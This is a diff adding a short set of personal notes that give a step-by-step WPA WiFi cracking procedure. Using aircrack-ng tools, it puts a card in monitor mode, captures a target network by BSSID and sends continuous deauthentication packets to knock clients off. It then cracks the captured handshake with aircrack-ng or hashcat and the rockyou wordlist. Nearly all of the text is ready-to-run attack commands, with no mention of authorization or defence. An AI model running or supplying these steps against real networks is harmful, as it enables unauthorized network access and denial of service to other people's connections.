@@ -1,0 +1,48 @@
+1) To view interface
+"airmon-ng"
+
+2) To start monitor mode
+"airmon-ng start (interface name)"
+ex:"airmon-ng start wlan0"
+not an actual step but it shows you that some proccesses have to be kill 
+so this may be skipped
+
+3) kill all unnessesary services
+Ex: "kill 2729 2854 3436 3564"
+better method
+Ex: airmon-ng check kill
+
+4) to view wireless traffic
+"airodump-ng (interface)"
+Ex: "airodump-ng wlan0"
+
+5) airodump-ng -c (channel) -w (name of save file) --bssid (wifi bssid) (interface)
+Ex: airodump-ng -c 6 -w test --bssid 14:D6:4D:25:96:A8 mon0
+
+6) open new terminal
+
+7)deathenticate a client
+"aireplay-ng -0 0 -a (bssid) (interface)"
+Ex: " aireplay-ng -0 0 -a 14:D6:4D:25:96:A8 mon0"
+
+8) View files created from commands
+"ls"
+
+9) only file needed is "name of file.cap"
+Ex: "test.cap"
+
+10 To crack with aircrack (skip to 11 to crack with hascat)
+"aircrack-ng -w (name of wordlist) (name of file trying to crack)
+Ex: aircrack-ng -w /usr/share/wordlists/rockyou.txt test-01.cap
+
+11) To crack the file.cap with hashcat you must first clean it. Pay close attention to the in and out .cap settings
+"wpaclean <out.cap> <in.cap>"
+Ex: "wpaclean test.cap test-01.cap"
+
+12) Next, Use capital J
+"aircrack-ng <out.cap> -J <out.hccap>"
+Ex: "aircrack-ng test.cap -J test"
+It will automatically add the .hccap to your file
+
+13)Use hashcat to brutefore or dictionary attack the file
+Ex for dictionary: "hashcat -m 2500 -a 0 -o cracked.txt test.hccap /usr/share/wordlists/rockyou.txt 
